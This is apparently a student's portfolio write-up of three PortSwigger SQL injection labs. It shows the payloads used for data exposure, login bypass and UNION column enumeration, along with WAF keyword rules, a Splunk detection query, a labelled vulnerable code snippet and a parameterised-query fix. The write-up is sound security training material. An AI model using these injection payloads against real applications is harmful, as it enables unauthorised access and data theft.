# Web Application Testing — SQL Injection Labs
## Tool: Burp Suite Community Edition
## Platform: PortSwigger Web Security Academy

---

## Overview
Completed three SQL injection labs on PortSwigger 
Web Security Academy demonstrating real web 
application attack techniques used in penetration 
testing engagements.

---

## Lab 1 — Hidden Data Retrieval
**Lab:** SQL injection vulnerability in WHERE 
clause allowing retrieval of hidden data
**Status:** Solved ✅

### Attack
Modified the category filter parameter to inject 
SQL that bypassed the released=1 restriction.

### Payload Used
```
'+OR+1=1--
```

### How It Works
Normal query:
```sql
SELECT * FROM products 
WHERE category='Accessories' AND released=1
```

Injected query:
```sql
SELECT * FROM products 
WHERE category='' OR 1=1--' AND released=1
```

The OR 1=1 makes the condition always true 
returning all products. The -- comments out 
the released=1 filter exposing hidden items.

### Impact
An attacker can view all database records 
including unreleased or confidential items 
that should be hidden from users.

---

## Lab 2 — Authentication Bypass
**Lab:** SQL injection vulnerability allowing 
login bypass
**Status:** Solved ✅

### Attack
Injected SQL into the username field to bypass 
password verification entirely.

### Payload Used
```
Username: administrator'--
Password: anything
```

### How It Works
Normal query:
```sql
SELECT * FROM users 
WHERE username='administrator' 
AND password='anything'
```

Injected query:
```sql
SELECT * FROM users 
WHERE username='administrator'
--' AND password='anything'
```

The -- comments out the password check. 
The database finds the administrator account 
and logs in without verifying the password.

### Impact
Complete authentication bypass — an attacker 
can log in as any user including administrator 
without knowing their password. This gives 
full administrative access to the application.

---

## Lab 3 — UNION Attack Column Enumeration
**Lab:** SQL injection UNION attack determining 
the number of columns returned by the query
**Status:** Solved ✅

### Attack
Used UNION SELECT with incrementing NULL values 
to determine the number of columns in the query.

### Payloads Tested
```
'+UNION+SELECT+NULL--           (failed)
'+UNION+SELECT+NULL,NULL--      (failed)  
'+UNION+SELECT+NULL,NULL,NULL-- (succeeded)
```

### Result
Query returns 3 columns. This is the essential 
first step in any UNION-based SQL injection 
attack — you must match the column count before 
extracting data.

### Impact
Knowledge of column count enables an attacker 
to craft UNION queries that extract sensitive 
data from other database tables including 
usernames, passwords, and confidential records.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Exploit Public-Facing Application | T1190 | SQL injection against web application |
| Valid Accounts | T1078 | Authentication bypass to gain admin access |

---

## How a Defender Would Detect This

### Web Application Firewall Rules
Flag requests containing SQL keywords in 
parameters: OR, UNION, SELECT, --, '

### Application Logging
Monitor for unusual query patterns or 
authentication anomalies — multiple login 
attempts with special characters in username field.

### Splunk Detection Query
```
index=* sourcetype=access_log 
| search uri="*UNION*" OR uri="*'+OR+*" OR uri="*'--*"
| stats count by src_ip, uri
| where count > 3
```

### Secure Coding Fix
Use parameterised queries instead of string 
concatenation:
```python
# Vulnerable
query = "SELECT * FROM users WHERE 
username='" + username + "'"

# Secure  
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

---

## Tools Used
- Burp Suite Community Edition
- PortSwigger Web Security Academy
- Browser URL manipulation

## Screenshots
[Attach your three solved lab screenshots here]



